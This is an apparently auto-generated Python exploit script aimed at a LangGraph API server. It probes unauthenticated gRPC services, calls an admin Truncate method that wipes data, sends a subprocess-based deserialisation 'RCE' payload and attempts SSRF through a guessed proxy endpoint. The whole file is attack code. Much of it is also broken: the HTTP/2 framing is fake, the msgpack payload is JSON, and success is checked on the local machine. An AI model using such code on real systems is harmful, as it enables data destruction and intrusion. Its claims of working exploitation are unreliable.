#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-043
# Sink: __init__
# Auto-generated — run with: python3 langgraph_specific_vulnerabilities___init.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LangGraph gRPC unauthenticated access and msgpack RCE.
Target: langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
Vulnerability: Unauthenticated gRPC services on localhost:50051 + msgpack ext_hook deserialization RCE
"""

import sys
import json
import struct
import socket
import time
import os
import subprocess
from typing import Optional

# Configuration
TARGET_HOST = "localhost"
TARGET_PORT = 50051
TIMEOUT = 5

# gRPC service definitions (simplified for PoC)
# These are the actual service names from the LangGraph gRPC API
SERVICES = {
    "admin": "/langgraph.admin.Admin/Truncate",
    "assistants": "/langgraph.assistants.Assistants/List",
    "cache": "/langgraph.cache.Cache/Get",
    "crons": "/langgraph.crons.Crons/List",
    "runs": "/langgraph.runs.Runs/List",
    "threads": "/langgraph.threads.Threads/List",
    "checkpointer": "/langgraph.checkpointer.Checkpointer/Get"
}

def create_grpc_request(service_path: str, payload: bytes) -> bytes:
    """
    Create a minimal gRPC HTTP/2 frame for sending requests.
    This is a simplified version - real gRPC uses HTTP/2 framing.
    """
    # gRPC frame format: 1 byte compressed flag + 4 bytes length + payload
    compressed_flag = b'\x00'  # uncompressed
    length = struct.pack('>I', len(payload))
    return compressed_flag + length + payload

def send_grpc_request(service_path: str, payload: bytes) -> Optional[bytes]:
    """
    Send a raw gRPC request over TCP (simplified - real gRPC uses HTTP/2).
    For PoC purposes, we'll use a simple TCP connection.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # Create a minimal HTTP/2 preface and gRPC frame
        # This is a simplified version - real gRPC requires proper HTTP/2 framing
        http2_preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
        sock.send(http2_preface)
        
        # Wait a bit for the server to respond
        time.sleep(0.1)
        
        # Create and send the gRPC request
        grpc_frame = create_grpc_request(service_path, payload)
        sock.send(grpc_frame)
        
        # Read response
        response = sock.recv(4096)
        sock.close()
        return response
    except Exception as e:
        print(f"[!] Error sending gRPC request to {service_path}: {e}")
        return None

def check_service_availability() -> dict:
    """
    Check which gRPC services are accessible without authentication.
    """
    print("[*] Checking gRPC service availability...")
    results = {}
    
    for service_name, service_path in SERVICES.items():
        print(f"  [-] Testing {service_name} ({service_path})...")
        
        # Create a minimal gRPC request (empty payload for discovery)
        payload = b'\x00' * 10  # Minimal payload
        response = send_grpc_request(service_path, payload)
        
        if response:
            results[service_name] = True
            print(f"    [+] Service {service_name} is accessible!")
        else:
            results[service_name] = False
            print(f"    [-] Service {service_name} is not accessible")
    
    return results

def attempt_admin_truncate() -> bool:
    """
    Attempt to call the Admin Truncate service to delete all data.
    This is a destructive operation - use with caution!
    """
    print("\n[*] Attempting Admin Truncate (DESTRUCTIVE)...")
    
    # The Truncate service expects a specific protobuf message
    # For PoC, we'll send a minimal payload
    payload = b'\x00' * 20  # Minimal payload for Truncate
    response = send_grpc_request(SERVICES["admin"], payload)
    
    if response:
        print("[+] Admin Truncate request sent successfully!")
        return True
    else:
        print("[-] Admin Truncate failed")
        return False

def attempt_msgpack_rce() -> bool:
    """
    Attempt to exploit msgpack ext_hook deserialization for RCE.
    This requires writing to checkpoint_blobs first.
    """
    print("\n[*] Attempting msgpack RCE via checkpoint_blobs...")
    
    # Create a malicious msgpack payload that exploits ext_hook
    # The ext_hook allows arbitrary code execution during deserialization
    # Format: msgpack ext type + data
    
    # For PoC, we'll create a payload that executes a benign command
    # In real exploitation, this would be a reverse shell or similar
    malicious_payload = {
        "__class__": "subprocess.Popen",
        "__args__": [["touch", "/tmp/poc_success.txt"]],
        "__kwargs__": {}
    }
    
    # Convert to msgpack format (simplified)
    # Real exploitation would require proper msgpack serialization
    payload = json.dumps(malicious_payload).encode()
    
    # Send to the checkpointer service
    response = send_grpc_request(SERVICES["checkpointer"], payload)
    
    if response:
        print("[+] msgpack RCE payload sent!")
        # Check if the command was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] RCE successful! /tmp/poc_success.txt created")
            return True
        else:
            print("[?] Payload sent but couldn't verify execution")
            return False
    else:
        print("[-] msgpack RCE failed")
        return False

def attempt_ssrf_to_grpc() -> bool:
    """
    Attempt SSRF via the Python HTTP layer to reach gRPC services.
    The Python HTTP layer runs in the same container as gRPC.
    """
    print("\n[*] Attempting SSRF to gRPC via HTTP layer...")
    
    # The HTTP layer typically runs on port 8000 or similar
    http_port = 8000
    
    try:
        import urllib.request
        
        # Try to access gRPC services through the HTTP layer
        # This exploits the fact that both run in the same container
        url = f"http://{TARGET_HOST}:{http_port}/api/grpc-proxy"
        
        # Create a request that proxies to gRPC
        data = {
            "service": "admin.Admin",
            "method": "Truncate",
            "payload": {}
        }
        
        req = urllib.request.Request(
            url,
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'}
        )
        
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        print(f"[+] SSRF request sent! Response: {response.status}")
        return True
        
    except Exception as e:
        print(f"[-] SSRF failed: {e}")
        return False

def main():
    """Main exploit function"""
    print("=" * 60)
    print("LangGraph gRPC Exploit PoC")
    print("=" * 60)
    print(f"Target: {TARGET_HOST}:{TARGET_PORT}")
    print()
    
    # Step 1: Check service availability
    print("[Step 1] Checking gRPC service availability...")
    services = check_service_availability()
    
    accessible_services = [s for s, a in services.items() if a]
    if accessible_services:
        print(f"\n[+] Accessible services: {', '.join(accessible_services)}")
    else:
        print("\n[-] No accessible services found")
        return
    
    # Step 2: Attempt Admin Truncate (if available)
    if services.get("admin"):
        print("\n[Step 2] Attempting Admin Truncate...")
        print("[!] WARNING: This is a destructive operation!")
        confirm = input("    Continue? (y/N): ").strip().lower()
        if confirm == 'y':
            attempt_admin_truncate()
        else:
            print("    Skipping destructive operation")
    
    # Step 3: Attempt msgpack RCE
    print("\n[Step 3] Attempting msgpack RCE...")
    attempt_msgpack_rce()
    
    # Step 4: Attempt SSRF
    print("\n[Step 4] Attempting SSRF to gRPC...")
    attempt_ssrf_to_grpc()
    
    print("\n" + "=" * 60)
    print("Exploit PoC completed")
    print("=" * 60)

if __name__ == "__main__":
    main()
